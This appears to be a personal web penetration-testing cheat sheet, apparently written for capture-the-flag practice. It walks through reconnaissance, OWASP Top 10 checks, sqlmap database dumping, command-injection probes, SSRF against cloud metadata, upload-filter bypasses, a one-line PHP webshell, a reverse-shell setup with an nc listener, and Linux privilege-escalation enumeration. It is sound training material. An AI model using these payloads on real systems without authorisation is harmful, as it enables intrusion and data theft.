# Web Security Methodology

## 1. Reconnaissance

```bash
# Fingerprint the server
curl -I http://<target>

# Quick wins before gobuster
curl http://<target>/robots.txt
curl http://<target>/sitemap.xml

# Full directory/file enum
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html -t 50 -o gobuster.txt

# If HTTPS with bad cert, add -k
gobuster dir -u https://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html -t 50 -k -o gobuster_ssl.txt
```

## 2. Technology Identification

- Wappalyzer browser extension (quick stack fingerprint)
- Check `/wp-login.php`, `/administrator`, `/phpmyadmin`, `/joomla` for known CMS
- WordPress detected → run wpscan:

```bash
wpscan --url http://<target> --enumerate u,p,t
wpscan --url http://<target> --username <user> --passwords /usr/share/wordlists/rockyou.txt
```

## 3. OWASP Top 10 Checklist

Work through these for every web target:

### A01 — Broken Access Control
- Try accessing admin/restricted pages directly (forceful browsing)
- Manipulate IDs in URLs/params: `/user?id=1` → `/user?id=2`
- Try accessing other users' resources after login
- Check for missing auth on API endpoints found in gobuster

### A02 — Cryptographic Failures
- Is sensitive data sent over HTTP (not HTTPS)?
- Weak/self-signed SSL cert (check validity, key size)
- Passwords stored/transmitted in plaintext or weak hash (MD5/SHA1)?
- Check page source and JS files for hardcoded secrets/API keys

### A03 — Injection
**SQL Injection:**
```bash
# Manual test — add ' to any input field or URL param
http://<target>/page?id=1'

# Automated
sqlmap -u "http://<target>/page?id=1" --dbs
sqlmap -u "http://<target>/page?id=1" -D <db> --tables
sqlmap -u "http://<target>/page?id=1" -D <db> -T <table> --dump
```

**Command Injection:**
- Test inputs with: `; id`, `| id`, `&& id`, `` `id` ``
- Look for ping fields, file name inputs, search boxes

**Other:** LDAP injection, XPath injection in login forms

### A04 — Insecure Design
- Business logic flaws: can you skip steps in a workflow?
- Can you purchase items for negative prices?
- Can you register with an existing admin username?

### A05 — Security Misconfiguration
- Default credentials on login pages (admin/admin, admin/password)
- Directory listing enabled (check gobuster hits — look for Index of /)
- Exposed config files: `.env`, `config.php`, `web.config`, `backup.sql`
- Verbose error messages leaking stack traces or DB info
- Unnecessary services/ports open

### A06 — Vulnerable and Outdated Components
- Note versions of CMS, frameworks, plugins
- Search: `<component> <version> exploit` or check exploit-db
- WPScan flags vulnerable plugins automatically

### A07 — Identification and Authentication Failures
- Try default/common credentials
- No account lockout? → brute force viable
- Weak password policy visible on registration
- "Remember me" token predictable?
- Check if session token changes after login (session fixation)

### A08 — Software and Data Integrity Failures
- JS loaded from external CDNs without SRI hash
- Deserialization inputs (Java serialized objects, PHP `unserialize()`)

### A09 — Security Logging and Monitoring Failures
- (Less testable in CTF — note if there's no rate limiting on login)

### A10 — Server-Side Request Forgery (SSRF)
- Any URL input fields? Try pointing at internal services:
  - `http://127.0.0.1/`
  - `http://169.254.169.254/` (AWS metadata)
- File upload that fetches from URL

## 4. File Upload Vulnerabilities

- Upload `.php` webshell if extension not validated
- If extension is filtered, try: `.php5`, `.phtml`, `.pHp`, `.php.jpg`
- Check if upload directory is web-accessible (gobuster)
- Intercept with Burp and change Content-Type if MIME checked

## 5. Getting a Shell

```bash
# PHP webshell (upload or paste into template editor)
<?php system($_GET['cmd']); ?>

# Pentest Monkey PHP reverse shell
# Edit IP and port, then upload
cp /usr/share/webshells/php/php-reverse-shell.php .

# Listener (allow port in UFW first!)
nc -lvnp 4444
```

## 6. Post-Exploitation (Linux)

```bash
# Stabilise shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm

# Basic enumeration
whoami && id
sudo -l
find / -perm -4000 2>/dev/null          # SUID binaries
find / -writable -type f 2>/dev/null    # Writable files
crontab -l; cat /etc/crontab            # Cron jobs
cat /etc/passwd | grep -v nologin

# Check GTFOBins for any SUID hits
# https://gtfobins.github.io
```
